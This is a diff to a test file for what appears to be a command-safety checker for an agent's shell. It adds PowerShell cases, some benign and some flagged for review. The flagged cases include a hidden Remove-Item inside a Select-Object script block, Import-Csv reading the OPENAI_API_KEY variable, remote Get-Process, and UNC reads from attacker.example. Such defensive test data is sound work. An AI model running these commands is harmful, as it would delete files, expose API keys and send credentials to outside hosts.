@@ -100,6 +100,11 @@ def shell(tmp_path, reload_for_data_dir):
     "hostname attacker",
     "tree -o listing.txt",
     "LD_PRELOAD=./hook.so ls",
+    # Get-Process on another computer signs in to it; a calculated column is a script block
+    "Get-Process -ComputerName server01",
+    "Get-Process -Comp server01",
+    "Get-Process | Select-Object ProcessName, @{Name='GB'; Expression={ Remove-Item notes.txt }}",
+    "Import-Csv env:OPENAI_API_KEY",
     # reading \\server\share connects to that server and signs in to it
     r"Get-Content \\attacker.example\share\x",
     "ls //attacker.example/share",
@@ -180,6 +185,14 @@ def test_lines_the_two_shells_read_differently_ask(shell, command):
     "Select-Object FullName",
     "Get-ChildItem | Where-Object { $_.Name -like '*.log' -and -not $_.PSIsContainer -or $_.Length -ge 1mb }",
     "Get-ChildItem | Where-Object Extension -eq '.txt'",
+    # what's running and what's in a CSV (U24)
+    "Get-Process",
+    "Get-Process -Name python",
+    "Get-Process | Where-Object WorkingSet64 -gt 1GB | Sort-Object WorkingSet64 -Descending | "
+    "Select-Object ProcessName, Id",
+    "Get-Process | Where-Object { $_.WorkingSet64 -gt 1GB } | Select-Object ProcessName, Id",
+    "Import-Csv 'Received Files/sales.csv' | Group-Object region",
+    "Import-Csv sales.csv | Measure-Object -Property quantity -Sum",
     "grep -rn TODO src | wc -l",
     'echo "a | b" | sort',
 ])
